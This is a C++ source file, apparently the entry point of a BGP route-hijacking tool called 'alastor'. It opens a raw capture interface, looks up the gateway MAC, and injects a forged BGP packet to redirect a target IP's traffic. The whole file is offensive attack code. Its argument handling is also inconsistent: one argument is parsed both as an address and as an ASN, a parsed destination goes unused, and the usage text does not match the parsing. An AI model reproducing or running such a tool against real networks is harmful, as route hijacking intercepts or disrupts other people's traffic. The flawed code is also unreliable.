#include "alastor.h"

int main(int argc, char* argv[]) {
	if (argc != 5) {
		cout << "Usage:" << endl << "alastor [target] [old destination] [local ASN] [seq]" << endl;
		return 1;
	}

	char errbuf[PCAP_ERRBUF_SIZE];

	cout << "Which interface number would you like to use?" << endl;
	int ii = 1;
	vector<iface> ifaces = getDevices();
	for (iface dev : ifaces) {
		cout << "Number " << to_string(ii) << ": " << dev.name << endl;
		ii++;
	}
	string ifacen;
	cin >> ifacen;

	pcap_t* handle = pcap_open_live(ifaces[stoi(ifacen) - 1].name.c_str(), 65536, 0, 1, errbuf);
	if (handle == NULL) {
		cout << endl << "Failed to open pcap handle." << endl;
		return 0;
	}

	uint8_t target[4];
	uint8_t ndest[4];
	uint8_t odest[4];
	strToIp(argv[1], target);
	strToIp(argv[2], odest);
	strToIp(argv[3], ndest);

	ULONG gateway[6];
	ULONG maclen = 6;
	if (SendARP(inet_addr("192.168.1.1"), INADDR_ANY, &gateway, &maclen) != NO_ERROR) {
		cout << endl << "Failed to find MAC address for default gateway." << endl;
		return 0;
	}
	
	if (!hijack(handle, target, odest, ifaces[stoi(ifacen) - 1].ip, htons(stoi(argv[3])), (uint8_t*)(BYTE*)gateway, stoi(argv[4]))) {
		cout << endl << "Failed to inject BGP packet. Are you sure that you've specified the correct interface?" << endl;
	}
	else {
		cout << endl << "Hijacked IP successfully!" << endl;
	}
	
	return 1;
}
